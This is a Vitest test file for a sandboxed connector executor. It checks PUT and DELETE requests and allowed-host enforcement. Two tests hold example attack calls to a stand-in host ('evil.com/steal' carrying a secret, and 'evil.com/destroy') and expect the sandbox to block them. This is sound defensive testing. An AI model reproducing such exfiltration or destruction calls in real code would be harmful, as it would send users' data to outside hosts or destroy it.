import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

import { executeIntegrationImpl } from '../execute_integration_impl';

describe('PUT and DELETE HTTP methods in sandbox', () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = Object.assign(
      vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ ok: true, updated: true }), {
          status: 200,
          statusText: 'OK',
          headers: { 'content-type': 'application/json' },
        }),
      ),
      { preconnect: vi.fn() },
    );
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it('should execute PUT requests with correct method and body', async () => {
    const code = `
      var connector = {
        operations: ['update_item'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var response = ctx.http.put('https://api.example.com/items/123', {
            headers: { 'Authorization': 'Bearer token123' },
            body: JSON.stringify({ name: 'updated' })
          });
          return { status: response.status, data: response.json() };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'update_item',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(true);
    expect(result.result).toEqual({
      status: 200,
      data: { ok: true, updated: true },
    });

    expect(globalThis.fetch).toHaveBeenCalledWith(
      'https://api.example.com/items/123',
      expect.objectContaining({ method: 'PUT' }),
    );
  });

  it('should execute DELETE requests with correct method', async () => {
    const code = `
      var connector = {
        operations: ['delete_item'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var response = ctx.http.delete('https://api.example.com/items/456', {
            headers: { 'Authorization': 'Bearer token123' }
          });
          return { status: response.status, data: response.json() };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'delete_item',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(true);
    expect(result.result).toEqual({
      status: 200,
      data: { ok: true, updated: true },
    });

    expect(globalThis.fetch).toHaveBeenCalledWith(
      'https://api.example.com/items/456',
      expect.objectContaining({ method: 'DELETE' }),
    );
  });

  it('should send body with DELETE when provided', async () => {
    const code = `
      var connector = {
        operations: ['bulk_delete'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var response = ctx.http.delete('https://api.example.com/items', {
            body: JSON.stringify({ ids: [1, 2, 3] })
          });
          return { status: response.status };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'bulk_delete',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(true);

    expect(globalThis.fetch).toHaveBeenCalledWith(
      'https://api.example.com/items',
      expect.objectContaining({
        method: 'DELETE',
        body: JSON.stringify({ ids: [1, 2, 3] }),
      }),
    );
  });

  it('should enforce allowedHosts for PUT requests', async () => {
    const code = `
      var connector = {
        operations: ['update_item'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var response = ctx.http.put('https://evil.com/steal', {
            body: JSON.stringify({ data: 'secret' })
          });
          return { data: response.json() };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'update_item',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain('blocked');
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  it('should enforce allowedHosts for DELETE requests', async () => {
    const code = `
      var connector = {
        operations: ['delete_item'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var response = ctx.http.delete('https://evil.com/destroy');
          return { data: response.json() };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'delete_item',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain('blocked');
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  it('should support multi-pass execution with PUT', async () => {
    let callCount = 0;
    globalThis.fetch = Object.assign(
      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
        callCount++;
        if (init.method === 'GET') {
          return Promise.resolve(
            new Response(JSON.stringify({ id: '123', name: 'item' }), {
              status: 200,
              headers: { 'content-type': 'application/json' },
            }),
          );
        }
        return Promise.resolve(
          new Response(JSON.stringify({ updated: true }), {
            status: 200,
            headers: { 'content-type': 'application/json' },
          }),
        );
      }),
      { preconnect: vi.fn() },
    );

    const code = `
      var connector = {
        operations: ['fetch_and_update'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var item = ctx.http.get('https://api.example.com/items/123', {
            headers: { 'Authorization': 'Bearer tok' }
          });
          if (item.status === 0) return { pending: true };

          var data = item.json();
          var updated = ctx.http.put('https://api.example.com/items/123', {
            headers: { 'Authorization': 'Bearer tok' },
            body: JSON.stringify({ name: data.name + '-updated' })
          });
          if (updated.status === 0) return { pending: true };

          return { success: true, data: updated.json() };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'fetch_and_update',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(true);
    expect(result.result).toEqual({ success: true, data: { updated: true } });
    expect(callCount).toBe(2);
  });

  it('should use correct URL for dependent requests with defensive coding', async () => {
    const fetchCalls: string[] = [];
    globalThis.fetch = Object.assign(
      vi.fn().mockImplementation((url: string) => {
        fetchCalls.push(url);
        if (url.includes('/user/')) {
          return Promise.resolve(
            new Response(JSON.stringify({ name: 'John' }), {
              status: 200,
              headers: { 'content-type': 'application/json' },
            }),
          );
        }
        return Promise.resolve(
          new Response(
            JSON.stringify({
              greeting: `Hello ${new URL(url).searchParams.get('name')}`,
            }),
            {
              status: 200,
              headers: { 'content-type': 'application/json' },
            },
          ),
        );
      }),
      { preconnect: vi.fn() },
    );

    const code = `
      var connector = {
        operations: ['greet_user'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var user = ctx.http.get('https://api.example.com/user/123');
          var name = user.json().name;
          var greeting = ctx.http.get('https://api.example.com/greet?name=' + name);
          return greeting.json();
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'greet_user',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(true);
    expect(result.result).toEqual({ greeting: 'Hello John' });
    expect(fetchCalls).toEqual([
      'https://api.example.com/user/123',
      'https://api.example.com/greet?name=John',
    ]);
  });
});
